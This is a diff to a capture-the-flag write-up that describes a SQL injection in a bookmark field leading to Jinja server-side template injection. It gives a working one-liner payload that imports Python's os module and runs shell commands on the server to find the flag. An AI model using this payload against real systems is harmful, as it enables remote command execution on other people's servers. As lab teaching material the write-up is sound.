@@ -50,14 +50,13 @@ Bookmarks are stored in a database and later rendered with Jinja.
 That means the data we insert is used in a raw SQL query → classic SQLi.
  One-Liner Payload (SQLi → SSTI)
  In the bookmark input field:
-<pre>' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('strings *').read() }}" -- </pre>
-<pre>Payload References: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md</pre>
+<pre>' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('strings * | grep -i pctf{').read() }}" -- </pre>
+<pre>Payload Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md</pre>
 
+And like that we get our beloved flag!
+
+
+<img width="1728" height="708" alt="5" src="https://github.com/user-attachments/assets/8fe90d5f-22f6-448b-90fb-2164a47a2acf" />
 ---
 
-### Trigger the Exploit
-
-Submit the malicious bookmark
-CTRL+F -> PCTF
-Flag!
 
